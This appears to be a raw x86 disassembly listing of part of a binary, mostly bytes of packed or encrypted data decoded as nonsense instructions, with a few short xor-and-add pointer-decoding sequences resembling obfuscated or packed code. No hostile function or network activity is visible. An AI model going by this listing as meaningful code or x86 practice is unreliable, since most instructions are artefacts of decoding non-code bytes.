  40ac9c:	or     bl,BYTE PTR ds:0x1d44dfbb
  40aca2:	sbb    BYTE PTR [edx-0x16],dh
  40aca5:	jne    0x40acbc
  40aca7:	mov    edi,0x360a02ad
  40acac:	fwait
  40acad:	(bad)  
  40acae:	jp     0x40ad24
  40acb0:	leave  
  40acb1:	xchg   edx,eax
  40acb2:	repz jle 0x40acc8
  40acb5:	(bad)  
  40acb6:	stos   DWORD PTR es:[edi],eax
  40acb7:	ret    
  40acb8:	add    eax,0xfbdba638
  40acbd:	inc    eax
  40acbe:	fwait
  40acbf:	inc    ebx
  40acc0:	outs   dx,BYTE PTR ds:[esi]
  40acc1:	mov    esp,0xaf705126
  40acc6:	pop    esi
  40acc7:	jmp    0x40ad33
  40acc9:	outs   dx,DWORD PTR ds:[esi]
  40acca:	xor    eax,0x30448aee
  40accf:	push   di
  40acd1:	jge    0x40ac63
  40acd3:	push   ebx
  40acd4:	adc    ebp,DWORD PTR [esi]
  40acd6:	or     al,0x85
  40acd8:	xchg   ecx,eax
  40acd9:	adc    ebp,DWORD PTR ds:0xd0e1bc8e
  40acdf:	jo     0x40acb0
  40ace1:	call   0x9c448c7f
  40ace6:	shl    BYTE PTR [edx+0x27],cl
  40ace9:	jno    0x40ad24
  40aceb:	jae    0x40ad1f
  40aced:	mov    edx,0x7afa17c8
  40acf2:	sub    dl,ah
  40acf4:	enter  0xb51d,0xc2
  40acf8:	adc    dl,cl
  40acfa:	outs   dx,DWORD PTR ds:[esi]
  40acfb:	inc    esi
  40acfc:	retf   
  40acfd:	test   al,0xe7
  40acff:	push   ebp
  40ad00:	mov    bh,0x25
  40ad02:	fidiv  DWORD PTR [ebp+esi*1+0x82f6bea]
  40ad09:	sub    BYTE PTR [esi],cl
  40ad0b:	mul    DWORD PTR [ecx-0x721ce09c]
  40ad11:	sub    bh,ah
  40ad13:	loop   0x40ad4b
  40ad15:	fldcw  WORD PTR ds:0xdb887e7
  40ad1b:	inc    ebp
  40ad1c:	jb     0x40ace0
  40ad1e:	imul   ebp,DWORD PTR [edx-0x7b92c4aa],0x37cadf31
  40ad28:	mov    ebp,esi
  40ad2a:	pop    ebp
  40ad2b:	daa    
  40ad2c:	dec    ecx
  40ad2d:	cmp    eax,0xeb81bc91
  40ad32:	sbb    dl,BYTE PTR [edi+eax*4+0x50]
  40ad36:	shl    esp,1
  40ad38:	add    BYTE PTR [ebx],0xc1
  40ad3b:	mov    ecx,DWORD PTR [ebp-0x8]
  40ad3e:	mov    ecx,DWORD PTR [ecx]
  40ad40:	mov    eax,DWORD PTR [eax+ecx*1]
  40ad43:	mov    DWORD PTR [ebp-0x1c],eax
  40ad46:	mov    eax,DWORD PTR [ebp+0x8]
  40ad49:	xor    eax,esi
  40ad4b:	add    eax,edi
  40ad4d:	mov    DWORD PTR [ebp-0x20],eax
  40ad50:	mov    eax,DWORD PTR [ebp+0x8]
  40ad53:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad56:	xor    eax,esi
  40ad58:	add    eax,edi
  40ad5a:	cmp    ecx,eax
  40ad5c:	je     0x40c082
  40ad62:	mov    eax,DWORD PTR [ebp-0x8]
  40ad65:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad68:	add    ecx,DWORD PTR [eax]
  40ad6a:	mov    DWORD PTR [ebp-0x20],ecx
  40ad6d:	jmp    0x40b08e
  40ad72:	adc    edx,esi
  40ad74:	inc    ebx
  40ad75:	sahf   
  40ad76:	popa   
  40ad77:	scas   eax,DWORD PTR es:[edi]
  40ad78:	icebp  
  40ad79:	jno    0x40adf2
  40ad7b:	ficomp WORD PTR [edi-0x31ce8e39]
  40ad81:	cwde   
  40ad82:	add    bl,dh
  40ad84:	jle    0x40ae04
  40ad86:	jp     0x40ae05
  40ad88:	jle    0x40ae08
  40ad8a:	dec    edi
  40ad8b:	sbb    BYTE PTR [ebp-0x29d5f9c4],ch
  40ad91:	leave  
  40ad92:	int3   
  40ad93:	sub    eax,0x3e9f284d
  40ad98:	arpl   WORD PTR [ecx+ebp*2+0x67],sp
  40ad9c:	push   eax
  40ad9d:	mov    ss,WORD PTR [ecx+eiz*1]
  40ada0:	nop
  40ada1:	aad    0xc7
  40ada3:	xchg   edx,ecx
  40ada5:	ror    DWORD PTR [edx+0x100d844a],cl
  40adab:	or     esi,DWORD PTR [esi-0x10]
  40adae:	push   edx
  40adaf:	cmc    
  40adb0:	or     al,0x98
  40adb2:	in     al,0xf0
  40adb4:	and    BYTE PTR [edx],cl
  40adb6:	int3   
  40adb7:	fidivr WORD PTR [ebx-0x3416a197]
  40adbd:	(bad)  [edx+0x579c4d9f]
  40adc3:	jp     0x40ae04
  40adc5:	xchg   ecx,eax
  40adc6:	fst    DWORD PTR [ebx+0x72]
  40adc9:	mov    edi,0x3ffc0b1f
  40adce:	stc    
  40adcf:	jae    0x40adb7
  40add1:	push   es
  40add2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40add3:	test   BYTE PTR [eax],dh
  40add5:	jmp    0x40ad6c
  40add7:	cmp    al,0x42
  40add9:	sub    BYTE PTR [esi+0x44737147],dh
  40addf:	pop    esi
  40ade0:	push   ss
  40ade1:	fldlg2 
  40ade3:	cmp    eax,DWORD PTR [edx-0x77ea4da]
  40ade9:	pop    edx
  40adea:	popf   
  40adeb:	stc    
  40adec:	bound  ebx,QWORD PTR [edi+edi*1]
  40adef:	int    0x9d
  40adf1:	mov    al,ds:0x8eac67b2
  40adf6:	rol    DWORD PTR [esi],0xf
  40adf9:	and    eax,0x86539d26
  40adfe:	add    al,0x3c
  40ae00:	sahf   
  40ae01:	add    al,BYTE PTR [ebx+0x67]
  40ae04:	adc    BYTE PTR [edx],al
  40ae06:	aam    0x2d
  40ae08:	and    esi,DWORD PTR [esi+edi*8+0x6b37d7df]
  40ae0f:	inc    ebp
  40ae10:	test   DWORD PTR [edi+ebx*2],esi
  40ae13:	shr    DWORD PTR [ecx-0x29],0x33
  40ae17:	retf   
  40ae18:	adc    al,0x72
  40ae1a:	cmp    esp,0xa7e94521
  40ae20:	and    BYTE PTR [edi+0x28],dl
  40ae23:	xchg   edx,eax
  40ae24:	adc    BYTE PTR [ebx-0x104d96c4],bh
  40ae2a:	test   DWORD PTR [ecx+0xd],ecx
  40ae2d:	mov    es,WORD PTR [ecx+0x59]
  40ae30:	and    BYTE PTR [ebp+0x7e],al
  40ae33:	xlat   BYTE PTR ds:[ebx]
  40ae34:	lock popa 
  40ae36:	mov    edx,0x9785066d
  40ae3b:	pop    esp
  40ae3c:	sub    BYTE PTR [ecx+esi*2-0x58db2a78],bh
  40ae43:	neg    DWORD PTR [ebx-0x32]
  40ae46:	jno    0x40ae6d
  40ae48:	(bad)  
  40ae49:	loopne 0x40ae14
  40ae4b:	xor    DWORD PTR [edi],esp
  40ae4d:	mov    bh,0x27
  40ae4f:	xchg   DWORD PTR [ecx+0x608a58f5],edx
  40ae55:	pop    esp
  40ae56:	mov    ds:0xd3c68bb4,eax
  40ae5b:	mov    ds:0x63cd03bc,al
  40ae60:	ret    
  40ae61:	push   ebx
  40ae62:	aaa    
  40ae63:	(bad)  
  40ae64:	xor    BYTE PTR ds:[esi+0x77214ea7],cl
  40ae6b:	xor    al,0x7d
  40ae6d:	loopne 0x40aedc
  40ae6f:	mov    ch,0xab
  40ae71:	add    bh,BYTE PTR [ebp-0x51]
  40ae74:	(bad)  
  40ae75:	xlat   BYTE PTR ds:[ebx]
  40ae76:	loopne 0x40ae12
  40ae78:	add    BYTE PTR es:[ecx+0x295001a9],bl
  40ae7f:	inc    ebp
  40ae80:	addr16 cs test eax,0x68fc10de
  40ae87:	je     0x40ae2e
  40ae89:	mov    ds:0xd111ea6c,al
  40ae8e:	adc    al,0x2
  40ae90:	or     esi,DWORD PTR [ecx-0x19]
  40ae93:	test   esi,ebx
  40ae95:	(bad)  [ebx-0x205a1c63]
  40ae9b:	jp     0x40ae2f
  40ae9d:	aaa    
  40ae9e:	jmp    0x40ae39
  40aea0:	loopne 0x40aeca
  40aea2:	icebp  
  40aea3:	ins    BYTE PTR es:[edi],dx
  40aea4:	mov    ch,0xd6
  40aea6:	adc    eax,0xd69e76cd
  40aeab:	pop    esp
  40aeac:	jne    0x40af0c
  40aeae:	mov    edx,0x299a860a
  40aeb3:	pop    ebx
  40aeb4:	lods   eax,DWORD PTR ds:[esi]
  40aeb5:	mov    ecx,0xc73227ee
  40aeba:	in     al,0x36
  40aebc:	data16 or al,0x38
  40aebf:	xor    cl,ch
  40aec1:	push   0xc5ba87dd
  40aec6:	push   esp
  40aec7:	dec    edx
  40aec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aec9:	sub    al,0xce
  40aecb:	xchg   ebp,eax
  40aecc:	pop    es
  40aecd:	inc    eax
  40aece:	sbb    eax,0x6401773d
  40aed3:	(bad)  
  40aed4:	dec    esp
  40aed5:	add    ecx,DWORD PTR [eax-0x2eb7db0a]
  40aedb:	xchg   edi,eax
  40aedc:	mov    edi,0xe9b2dbc1
  40aee1:	mov    ds:0x4affae95,eax
  40aee6:	shl    DWORD PTR [eax],0xed
  40aee9:	xchg   DWORD PTR [edx+0x5e],ebx
  40aeec:	mov    ecx,0xc0a92d97
  40aef1:	jne    0x40af28
  40aef3:	mov    ebp,ds
  40aef5:	icebp  
  40aef6:	retf   
  40aef7:	pop    ds
  40aef8:	outs   dx,DWORD PTR ds:[esi]
  40aef9:	repnz cmps DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40aefc:	jmp    0xcdc4b1ff
  40af01:	mov    ds:0xeab5c1a9,al
  40af06:	aad    0x33
  40af08:	outs   dx,DWORD PTR ds:[esi]
  40af09:	xor    al,0xc9
  40af0b:	std    
  40af0c:	inc    eax
  40af0d:	mov    dh,0x2a
  40af0f:	mov    dh,0x21
  40af11:	inc    esp
  40af12:	jg     0x40aed0
  40af14:	std    
  40af15:	mov    BYTE PTR [ecx-0x76e06535],bh
  40af1b:	mov    dh,0x72
  40af1d:	cmp    DWORD PTR [eax],eax
  40af1f:	xchg   ebx,eax
  40af20:	ja     0x40aef5
  40af22:	not    edx
  40af24:	mov    edi,0xa462ba6
  40af29:	add    eax,0x7740d1a1
  40af2e:	repz or eax,0x357a8ef
  40af34:	xchg   edi,eax
  40af35:	clc    
  40af36:	popf   
  40af37:	inc    edx
  40af38:	mov    bl,0xcd
  40af3a:	neg    ebx
  40af3c:	shl    BYTE PTR [esi+0xe],cl
  40af3f:	addr16 je 0x40af3c
  40af42:	cmc    
  40af43:	mov    DWORD PTR [esi+ecx*1+0x48],esp
  40af47:	add    DWORD PTR [ebx+0xa],eax
  40af4a:	(bad)
  40af4e:	sub    eax,0x60dfda6f
  40af53:	aas    
  40af54:	xchg   edi,eax
  40af55:	xchg   ebx,eax
  40af56:	fldcw  WORD PTR ds:0xc27f7a10
  40af5c:	push   ss
  40af5d:	imul   ebx,ebp,0x70
  40af60:	popf   
  40af61:	and    eax,0xbb4fbd14
  40af66:	pop    ds
  40af67:	cmp    ch,dl
  40af69:	js     0x40af01
  40af6b:	sub    dh,BYTE PTR [esi+0x46]
  40af6e:	aaa    
  40af6f:	push   ds
  40af70:	sbb    edi,DWORD PTR [edx-0x57]
  40af73:	mov    edx,0xa84629ee
  40af78:	pop    ds
  40af79:	ror    edx,1
  40af7b:	fdivr  QWORD PTR [ebx+0x42]
  40af7e:	out    dx,al
  40af7f:	or     dh,BYTE PTR [edi]
  40af81:	push   esp
  40af82:	add    eax,0xadc9e03c
  40af87:	rcl    DWORD PTR [edi+0x4f32168a],cl
  40af8d:	push   cs
  40af8e:	retf   0xcb0b
  40af91:	jecxz  0x40afc6
  40af93:	js     0x40af1f
  40af95:	dec    ecx
  40af96:	push   ebp
  40af97:	in     eax,0x11
  40af99:	cli    
  40af9a:	mul    BYTE PTR ds:0x9b1e22d4
  40afa0:	push   esp
  40afa1:	pop    ds
  40afa2:	or     BYTE PTR [eax-0x15ada86],dh
  40afa8:	retf   0x32f3
  40afab:	dec    edi
  40afac:	mov    eax,ds:0x79d91bbb
  40afb1:	stos   BYTE PTR es:[edi],al
  40afb2:	adc    DWORD PTR [eax+0x58],0xffffffa5
  40afb6:	lds    esp,FWORD PTR [esi+0x1d2b27a3]
  40afbc:	sbb    al,BYTE PTR [ebp+0x2c4c9029]
  40afc2:	jle    0x40afe4
  40afc4:	(bad)  
  40afc5:	push   ss
  40afc6:	add    al,0xcb
  40afc8:	push   eax
  40afc9:	out    0xe8,al
  40afcb:	in     eax,0x67
  40afcd:	scas   al,BYTE PTR es:[edi]
  40afce:	jbe    0x40af72
  40afd0:	out    0x8,eax
  40afd2:	(bad)  
  40afd3:	mov    dh,0xb4
  40afd5:	xchg   DWORD PTR [ecx+0x6e],edi
  40afd8:	loopne 0x40b043
  40afda:	das    
  40afdb:	fbld   TBYTE PTR [ebx+0x43]
  40afde:	enter  0x1f3b,0xa7
  40afe2:	js     0x40b002
  40afe4:	shr    BYTE PTR [ebx-0x694046ca],0x55
  40afeb:	or     ebx,esi
  40afed:	lahf   
  40afee:	pop    edx
  40afef:	ficom  DWORD PTR [eax]
  40aff1:	or     al,BYTE PTR [esi+edx*8]
  40aff4:	and    BYTE PTR [ebp+ebx*4-0x57],ch
  40aff8:	sti    
  40aff9:	fs scas eax,DWORD PTR es:[edi]
  40affb:	lods   eax,DWORD PTR ds:[esi]
  40affc:	ss mov bh,0x4e
  40afff:	pop    ds
  40b000:	repnz fidiv DWORD PTR [ebx+0xe944734]
  40b007:	stc    
  40b008:	ror    DWORD PTR [eax],0x68
  40b00b:	mov    ebp,0x906e4b1c
  40b010:	cmp    cl,dl
  40b012:	mov    eax,ds:0x43cbad6e
  40b017:	in     eax,0xed
  40b019:	jae    0x40afeb
  40b01b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b01c:	sbb    dl,BYTE PTR [edi+0x360d56a3]
  40b022:	sub    al,0x41
  40b024:	jg     0x40b082
  40b026:	sbb    DWORD PTR [ebp-0x43c6e050],ebp
  40b02c:	mov    edx,0x793630f5
  40b031:	jo     0x40afb9
  40b033:	test   WORD PTR [ebx-0x4c01c196],di
  40b03a:	retf   0xd33a
  40b03d:	xor    edi,ebx
  40b03f:	or     al,0x56
  40b041:	arpl   di,bp
  40b043:	xchg   ebp,eax
  40b044:	inc    BYTE PTR [edi-0x6e]
  40b047:	test   al,0xd5
  40b049:	les    esi,FWORD PTR [ebp-0x63ef1ac5]
  40b04f:	cdq    
  40b050:	pop    ds
  40b051:	cmp    ch,dl
  40b053:	test   eax,0x17d62dcc
  40b058:	adc    ah,BYTE PTR [edi+ecx*2+0x4d]
  40b05c:	verw   WORD PTR [eax-0x24]
  40b060:	lock cmp cl,BYTE PTR [edx-0x1c]
  40b064:	sbb    eax,0x2b29947d
  40b069:	and    cl,dl
  40b06b:	inc    esi
  40b06c:	dec    ebp
  40b06d:	xor    al,0x5b
  40b06f:	jmp    0x40b07d
  40b071:	imul   esp,DWORD PTR [ebx-0x30bd5d26],0x2b201fd4
  40b07b:	icebp  
  40b07c:	(bad)  
  40b07d:	popf   
  40b07e:	push   ds
  40b07f:	xor    BYTE PTR [esi+0xe],al
  40b082:	lods   eax,DWORD PTR ds:[esi]
  40b083:	mov    bl,0x59
  40b085:	jp     0x40b0f4
  40b087:	xor    eax,0x8a0be3f7
  40b08c:	adc    BYTE PTR [edi-0x741fba75],0x4d
  40b093:	clc    
  40b094:	mov    eax,DWORD PTR [eax+0xc]
  40b097:	mov    ecx,DWORD PTR [ecx]
  40b099:	mov    al,BYTE PTR [eax+ecx*1]
  40b09c:	add    al,0x38
  40b09e:	xor    al,0x46
  40b0a0:	cmp    al,0xc5
  40b0a2:	je     0x40b6fb
  40b0a8:	jmp    0x40b3c9
  40b0ad:	sar    DWORD PTR [ecx],1
  40b0af:	mov    cl,0xa4
  40b0b1:	mov    cl,0x74
  40b0b3:	shr    DWORD PTR [ecx+0x55],1
  40b0b6:	fsubr  DWORD PTR [eax+0x37]
  40b0b9:	add    edi,edi
  40b0bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0bc:	fisttp QWORD PTR [esi+edi*8]
  40b0bf:	jle    0x40b13f
  40b0c1:	jp     0x40b140
  40b0c3:	jle    0x40b143
  40b0c5:	dec    esp
  40b0c6:	jo     0x40b0f0
  40b0c8:	out    0xdf,al
  40b0ca:	mov    dh,BYTE PTR [ecx-0x606fa235]
  40b0d0:	bound  ebp,QWORD PTR [ecx+0x29]
  40b0d3:	cld    
  40b0d4:	in     eax,dx
  40b0d5:	and    eax,0xa2487c7d
  40b0da:	cmp    BYTE PTR [ebx*2-0x785280ea],0x7d
  40b0e2:	xor    bh,BYTE PTR [eax]
  40b0e4:	repz into 
  40b0e6:	sbb    BYTE PTR ds:0x359da11,al
  40b0ec:	fst    QWORD PTR [ebx+0x5c06d4af]
  40b0f2:	dec    ecx
  40b0f3:	xchg   edx,eax
  40b0f4:	mov    edx,0xfdd849b8
  40b0f9:	dec    eax
  40b0fa:	aam    0x57
  40b0fc:	push   ds
  40b0fd:	and    dh,BYTE PTR [ebp-0x7f1432f5]
  40b103:	std    
  40b104:	pop    ebx
  40b105:	mov    ds:0x597bb51f,eax
  40b10a:	std    
  40b10b:	fstp   TBYTE PTR [ecx]
  40b10d:	outs   dx,BYTE PTR ds:[esi]
  40b10e:	cmc    
  40b10f:	out    dx,eax
  40b110:	mov    ds:0x653a606e,eax
  40b115:	push   cs
  40b116:	dec    ebp
  40b117:	sbb    BYTE PTR [ebx],cl
  40b119:	pop    es
  40b11a:	push   edi
  40b11b:	pusha  
  40b11c:	fucomp st(1)
  40b11e:	mov    eax,ds:0xa3598fa0
  40b123:	popf   
  40b124:	add    BYTE PTR [edi+eax*4+0x7d],0xd0
  40b129:	sbb    al,0xae
  40b12b:	sub    DWORD PTR [esi+0x7664f805],ecx
  40b131:	and    BYTE PTR [ebp+0x68],ch
  40b134:	(bad)  [edx]
  40b136:	lahf   
  40b137:	not    DWORD PTR [ebx]
  40b139:	pushf  
  40b13a:	popa   
  40b13b:	in     eax,dx
  40b13c:	adc    DWORD PTR [ecx+0x51],ebx
  40b13f:	bound  ebp,QWORD PTR [edi]
  40b141:	sbb    DWORD PTR [ebx+ecx*2],ebp
  40b144:	out    0x5d,eax
  40b146:	fnstenv [ebp+ebp*2+0x579b65d7]
  40b14d:	cmp    DWORD PTR [edi-0xc],esp
  40b150:	imul   ebp,DWORD PTR ds:0x2afd4e1a,0xaf04a70d
  40b15a:	inc    ebp
  40b15b:	inc    ecx
  40b15c:	icebp  
  40b15d:	rol    DWORD PTR [esi],0x51
  40b160:	xchg   esp,eax
  40b161:	jecxz  0x40b0f2
  40b163:	test   al,0x33
  40b165:	pop    ds
  40b166:	int3   
  40b167:	or     edx,ecx
  40b169:	sbb    BYTE PTR [ebx-0x1f],bl
  40b16c:	xchg   edx,eax
  40b16d:	jle    0x40b187
  40b16f:	push   ebp
  40b170:	sub    ah,BYTE PTR [esi+edi*2+0x109ff8e4]
  40b177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b178:	mov    edx,0x56fbf018
  40b17d:	add    bl,bl
  40b17f:	int3   
  40b180:	push   edx
  40b181:	hlt    
  40b182:	sub    esp,DWORD PTR [esi]
  40b184:	inc    ebp
  40b185:	out    0x74,al
  40b187:	mov    WORD PTR [esi+ecx*4+0x1da142dc],?
  40b18e:	imul   ecx,DWORD PTR [ecx+esi*2+0x516a56d1],0x5fe1441a
  40b199:	jmp    0x9b44:0xc9066cb1
  40b1a0:	cld    
  40b1a1:	mov    WORD PTR [ecx],es
  40b1a3:	popf   
  40b1a4:	(bad)  
  40b1a5:	push   cs
  40b1a6:	sub    edx,edx
  40b1a8:	jp     0x40b1d6
  40b1aa:	mov    esi,esp
  40b1ac:	push   es
  40b1ad:	mov    al,0x1a
  40b1af:	jge    0x40b1f1
  40b1b1:	jo     0x40b174
  40b1b3:	cdq    
  40b1b4:	fwait
  40b1b5:	cs xchg edi,eax
  40b1b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1b8:	cmp    BYTE PTR [ebp+0x140e0aba],cl
  40b1be:	mov    esp,0x6fbbf6f9
  40b1c3:	stos   DWORD PTR es:[di],eax
  40b1c5:	lahf   
  40b1c6:	inc    edx
  40b1c7:	xchg   BYTE PTR [ecx],dl
  40b1c9:	lea    ecx,[edi-0x3f]
  40b1cc:	neg    BYTE PTR [esi+0x5a]
  40b1cf:	xor    BYTE PTR [esi],dh
  40b1d1:	push   ebx
  40b1d2:	lds    esi,FWORD PTR [edi]
  40b1d4:	imul   ebp,DWORD PTR [edi+0x7baf2f1e],0xbc5af613
  40b1de:	xchg   ecx,eax
  40b1df:	or     eax,0x4e90b2dc
  40b1e4:	sub    al,0x5f
  40b1e6:	int    0x99
  40b1e8:	(bad)  [ebx]
  40b1ea:	ret    0x9971
  40b1ed:	ja     0x40b204
  40b1ef:	outs   dx,BYTE PTR ds:[esi]
  40b1f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1f1:	mov    bh,0x93
  40b1f3:	mov    cs,WORD PTR gs:[edx-0x28]
  40b1f7:	push   ecx
  40b1f8:	icebp  
  40b1f9:	sub    bh,BYTE PTR [edi]
  40b1fb:	bound  esi,QWORD PTR [esi+0x35]
  40b1fe:	xor    al,0xf1
  40b200:	inc    ecx
  40b201:	push   ebp
  40b202:	xor    BYTE PTR [ebp-0x2797661b],ch
  40b208:	sti    
  40b209:	in     eax,0xa
  40b20b:	mov    eax,0xa2a861fe
  40b210:	shr    DWORD PTR [ebx-0x6c],1
  40b213:	add    esi,DWORD PTR [esi-0x71]
  40b216:	dec    di
  40b218:	adc    al,0xad
  40b21a:	popa   
  40b21b:	jmp    0x126d75d1
  40b220:	call   0x82e5403
  40b225:	jb     0x40b263
  40b227:	mov    esp,0x739c4f0e
  40b22c:	mov    ah,BYTE PTR [esi]
  40b22e:	jmp    0x51f9c806
  40b233:	cdq    
  40b234:	lds    esp,FWORD PTR [edx]
  40b236:	mov    bl,0xa3
  40b238:	mov    ah,BYTE PTR [eax]
  40b23a:	jp     0x40b1f5
  40b23c:	rol    BYTE PTR [edx+0x14db4702],0xbd
  40b243:	mov    edi,0xf9e4ac8d
  40b248:	sti    
  40b249:	sbb    eax,0x58b6d2de
  40b24e:	imul   ecx,DWORD PTR [ecx-0x70],0xffffff86
  40b252:	xchg   DWORD PTR [eax],ecx
  40b254:	push   edx
  40b255:	arpl   WORD PTR [ebx],si
  40b257:	pop    ss
  40b258:	mov    eax,DWORD PTR [ecx+0x24]
  40b25b:	mov    ds:0x2e1f3c23,eax
  40b260:	mov    BYTE PTR [edi+0xbbb0dd4],cl
  40b266:	test   BYTE PTR [ecx+0x2dfd94ab],ch
  40b26c:	mov    esi,0x86c7a1f
  40b271:	(bad)  
  40b272:	mov    edx,0x4d4accf7
  40b277:	je     0x40b262
  40b279:	or     eax,0x12839dd9
  40b27e:	iret   
  40b27f:	push   esp
  40b280:	sbb    al,0xe0
  40b282:	push   edi
  40b283:	xchg   esp,eax
  40b284:	xor    ch,BYTE PTR [eax]
  40b286:	jg     0x40b273
  40b288:	(bad)
  40b28c:	mov    eax,ebx
  40b28e:	pop    edi
  40b28f:	adc    al,BYTE PTR [esi+0x68]
  40b292:	test   al,0x4
  40b294:	pop    ebx
  40b295:	fs mov al,0xb6
  40b298:	lock dec esi
  40b29a:	xchg   ebx,eax
  40b29b:	and    esi,eax
  40b29d:	lods   al,BYTE PTR ds:[esi]
  40b29e:	das    
  40b29f:	(bad)  
  40b2a0:	mov    eax,0xa19efd1d
  40b2a5:	mov    al,ds:0xb38f7ccd
  40b2aa:	aaa    
  40b2ab:	mov    ds:0x28726e4f,eax
  40b2b0:	mov    al,ds:0x428e25db
  40b2b5:	xchg   ecx,eax
  40b2b6:	fimul  DWORD PTR [eax+ebp*1]
  40b2b9:	mov    ds:0x35318683,al
  40b2be:	bound  esi,QWORD PTR [esi]
  40b2c0:	aad    0xfc
  40b2c2:	in     al,dx
  40b2c3:	mov    ds:0x70580f8f,eax
  40b2c8:	mov    edx,0x5f045503
  40b2cd:	pop    edx
  40b2ce:	cmc    
  40b2cf:	aam    0xe2
  40b2d1:	pop    ss
  40b2d2:	cli    
  40b2d3:	push   esi
  40b2d4:	mov    al,dl
  40b2d6:	aas    
  40b2d7:	xchg   edi,eax
  40b2d8:	sbb    eax,DWORD PTR [ebx+0x10]
  40b2db:	cs enter 0xb5a3,0xcb
  40b2e0:	mov    esp,cs
  40b2e2:	cld    
  40b2e3:	retf   
  40b2e4:	repz pop ebp
  40b2e6:	mov    ebx,0x638b17a8
  40b2eb:	rol    BYTE PTR [esi-0x53],0xdd
  40b2ef:	dec    esi
  40b2f0:	out    dx,eax
  40b2f1:	outs   dx,BYTE PTR ds:[esi]
  40b2f2:	(bad)  
  40b2f4:	adc    DWORD PTR [edi],ebx
  40b2f6:	and    al,0x1d
  40b2f8:	push   es
  40b2f9:	mov    ebx,0xc731db68
  40b2fe:	in     eax,dx
  40b2ff:	pop    ss
  40b300:	pop    eax
  40b301:	adc    eax,0xcb9f7649
  40b306:	ficom  DWORD PTR [edx-0x1d71ad4f]
  40b30c:	fstp   st(2)
  40b30e:	push   es
  40b30f:	fadd   QWORD PTR [eax]
  40b311:	pop    es
  40b312:	mov    ch,0xd6
  40b314:	jmp    0x40b366
  40b316:	and    esp,0xffffffce
  40b319:	int    0x33
  40b31b:	mov    esp,0xd047c680
  40b320:	loopne 0x40b2e2
  40b322:	scas   eax,DWORD PTR es:[edi]
  40b323:	dec    edi
  40b324:	in     eax,0x59
  40b326:	xchg   edi,eax
  40b327:	ret    
  40b328:	xchg   esp,eax
  40b329:	popa   
  40b32a:	mov    WORD PTR [ecx+0x64],es
  40b32d:	or     dh,BYTE PTR [esi]
  40b32f:	xchg   DWORD PTR [edx-0x2308a3dc],ebx
  40b335:	xor    esp,DWORD PTR [ecx-0x1bad6596]
  40b33b:	popf   
  40b33c:	push   esp
  40b33d:	jns    0x40b32d
  40b33f:	(bad)  [edi+0x6f]
  40b342:	enter  0x5064,0xef
  40b346:	sbb    eax,0x29fa488c
  40b34b:	js     0x40b3aa
  40b34d:	jle    0x40b33b
  40b34f:	pop    ss
  40b350:	daa    
  40b351:	adc    ebx,DWORD PTR [eax-0x42]
  40b354:	jge    0x40b315
  40b356:	mov    ebp,0x1d8f1c7a
  40b35b:	inc    esi
  40b35c:	jge    0x40b368
  40b35e:	mov    ds:0xc4cfab70,al
  40b363:	pushf  
  40b364:	and    BYTE PTR [ebx+0x8],dh
  40b367:	mov    DWORD PTR [esi-0x1c352a64],esi
  40b36d:	push   es
  40b36e:	rol    DWORD PTR [ebp+0x60],0xb7
  40b372:	and    eax,0x185a0f65
  40b377:	mov    DWORD PTR [eax+0xc],eax
  40b37a:	fcomip st,st(7)
  40b37c:	fiadd  WORD PTR [ebx+0x36]
  40b37f:	cmp    BYTE PTR [eax-0x5cb38335],ch
  40b385:	jo     0x40b391
  40b387:	mov    ebx,0x19b4dcb8
  40b38c:	jb     0x40b37e
  40b38e:	add    cl,BYTE PTR [ecx+eiz*1]
  40b391:	std    
  40b392:	hlt    
  40b393:	mov    ss,WORD PTR [eax+0x41]
  40b396:	add    edi,DWORD PTR [ecx+0x1b]
  40b399:	(bad)  
  40b39b:	dec    eax
  40b39c:	dec    BYTE PTR ds:0x32d6fc4
  40b3a2:	dec    ebp
  40b3a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3a4:	mov    DWORD PTR [ecx+ebp*2-0x55d2d17a],edi
  40b3ab:	hlt    
  40b3ac:	xchg   BYTE PTR [ebx+0x7a],dh
  40b3af:	push   es
  40b3b0:	retf   
  40b3b1:	out    0x47,al
  40b3b3:	xchg   BYTE PTR [edx-0x1c143e78],dl
  40b3b9:	test   al,0xba
  40b3bb:	test   al,0x8b
  40b3bd:	jno    0x40b3c6
  40b3bf:	inc    edx
  40b3c0:	jno    0x40b3df
  40b3c2:	or     ebp,DWORD PTR [esi+0xb]
  40b3c5:	popf   
  40b3c6:	jge    0x40b3da
  40b3c8:	mov    eax,DWORD PTR [di+0x8]
  40b3cc:	mov    ecx,DWORD PTR [ebp-0x8]
  40b3cf:	xor    eax,esi
  40b3d1:	add    eax,edi
  40b3d3:	jmp    0x40b6f4
  40b3d8:	and    eax,0x5044d49b
  40b3dd:	jno    0x40b394
  40b3df:	pop    ebx
  40b3e0:	xchg   ebp,eax
  40b3e1:	sar    eax,cl
  40b3e3:	cmp    eax,0xc71e7ead
  40b3e8:	or     ch,bh
  40b3ea:	jle    0x40b46a
  40b3ec:	jp     0x40b46b
  40b3ee:	jle    0x40b46e
  40b3f0:	loope  0x40b43d
  40b3f2:	push   ecx
  40b3f3:	call   0xe02aae55
  40b3f8:	imul   edi,DWORD PTR [ebx+0x41],0x59bcb90a
  40b3ff:	imul   edx,DWORD PTR [ebx],0x4dc225a6
  40b405:	neg    BYTE PTR ds:0xc6e258f1
  40b40b:	pop    ecx
  40b40c:	ins    BYTE PTR es:[edi],dx
  40b40d:	sbb    al,0x36
  40b40f:	shl    bl,cl
  40b411:	adc    ecx,DWORD PTR [esi-0x60]
  40b414:	xor    BYTE PTR ds:0x2499f7b6,cl
  40b41a:	sbb    edx,esi
  40b41c:	popf   
  40b41d:	push   edi
  40b41e:	add    BYTE PTR [edi],0x92
  40b421:	mov    edi,0x4a335a0e
  40b426:	inc    edi
  40b427:	leave  
  40b428:	mov    al,0x86
  40b42a:	sar    DWORD PTR [ebx-0x66c825d6],1
  40b430:	hlt    
  40b431:	rcl    BYTE PTR [eax-0x16],cl
  40b434:	das    
